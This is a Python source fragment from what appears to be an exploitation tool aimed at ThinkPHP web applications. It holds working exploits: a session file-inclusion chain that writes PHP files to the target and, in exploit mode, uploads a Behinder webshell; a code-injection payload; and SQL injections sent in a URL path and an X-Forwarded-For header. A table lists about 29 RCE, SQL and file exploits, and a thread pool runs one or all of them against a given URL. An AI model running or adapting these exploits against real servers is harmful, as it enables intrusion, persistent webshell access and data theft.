                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
            
    def tp5_cache_include_file(self):
        appName = 'thinkphp5'
        pocname = 'tp5_cache_include_file'
        method = 'post'
        
        PHPSESSID = random_name(25)
        scriptname = random_name(6)+'.php'
        path1 = '/index.php?s=captcha'
        path2 = scriptname
        vulntxt = 'VuLnEcHoPoCSuCCeSS'
        payload = "<?php+$a='file_put_contents';$b='base64_decode';$a($b('{}'),$b('{}'),FILE_APPEND);?>".format(base64.b64encode(scriptname.encode()).decode(),quote(base64.b64encode(vulntxt.encode()).decode(),'utf-8'))
        post_param1 = r"_method=__construct&filter[]=think\Session::set&method=get&get[]={random}&server[]=1"
        post_param2 = r"_method=__construct&method=GET&filter[]=think\__include_file&get[]=/tmp/sess_{random}&server[]=1"
        
        desc = '[file] '+self.url+'/'+path2
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
            "Content-type": "application/x-www-form-urlencoded",
            "Cache-Control": "no-cach",
            "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
            "Cookie": "PHPSESSID="+PHPSESSID}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+'/'+path2, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if "VuLnEcHoPoCSuCCeSS" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                vulntxt = self.webshell_copy
                payload = "<?php+$a='file_put_contents';$b='base64_decode';$a($b('{}'),$b('{}'),FILE_APPEND);?>".format(base64.b64encode(scriptname.encode()).decode(),quote(base64.b64encode(vulntxt.encode()).decode(),'utf-8'))
                r = exprequest.post(self.url+path1, data=post_param1.replace(r'{random}',payload), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.post(self.url+path1, data=post_param2.replace(r'{random}',PHPSESSID), headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                r = exprequest.get(self.url+'/'+path2, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                print(desc+' Behinder3 '+str(r.status_code)+' length='+str(len(r.text)))
        except Exception as error:
            return output.error_output(str(error))
        
    #ThinkPHP?
    def tp_cache(self):
        appName = 'thinkphp'
        pocname = 'tp_cache'
        path = '/index.php/Home/Index/index.html'
        method = 'post'
        desc = '命令执行描述'
        data = r'a3=%0d%0avar_dump(11111);%0d%0a//'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"11111" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

    def tp_pay_orderid_sqli(self):
        appName = 'thinkphp'
        pocname = 'tp_pay_orderid_sqli'
        path = '/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))


    def tp_view_recent_xff_sqli(self):
        appName = 'thinkphp'
        pocname = 'tp_view_recent_xff_sqli'
        path = '/index.php?s=/home/article/view_recent/name/1'
        method = 'get'
        desc = '命令执行描述'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'X-Forwarded-For': "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"}
        #输出类
        output = Output(self.url, pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"56540676a129760a" in r.text:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row([
    "ThinkPHP3",
    "tp3_select_find_delete_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP3",
    "tp3_cache_file",
    "[file]"
])
tb.add_row([
    "ThinkPHP3",
    "tp3_order_by_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP3",
    "tp3_update_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_1",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_2",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_3",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_4",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_5",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_6",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_7",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_debug_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_debug_index_ids_sqli",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_driver_display_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_invoke_func_code_exec_1",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_invoke_func_code_exec_2",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_invoke_func_code_exec_3",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_method_filter_code_exec",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_request_input_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_templalte_driver_rce",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_query_max_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_Builder_parseData_insert_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_Builder_parseData_orderby_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_Mysql_parseWhereItem_select_sql",
    "[sql]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_construct_code_exec_1",
    "[rce]"
])
tb.add_row([
    "ThinkPHP5",
    "tp5_cache_include_file",
    "[rce]"
])
tb.add_row([
    "ThinkPHP?",
    "tp_cache",
    "[file]"
])
tb.add_row([
    "ThinkPHP?",
    "tp_pay_orderid_sqli",
    "[sql]"
])
tb.add_row([
    "ThinkPHP?",
    "tp_view_recent_xff_sqli",
    "[sql]"
])
print('eg: http://192.168.243.133/thinkphp_5.0.15/public/')
print(tb)

def check(**kwargs):
    thread_list = []
    ExpThinkPHP = ThinkPHP(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpThinkPHP, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(ThinkPHP):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpThinkPHP, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)








































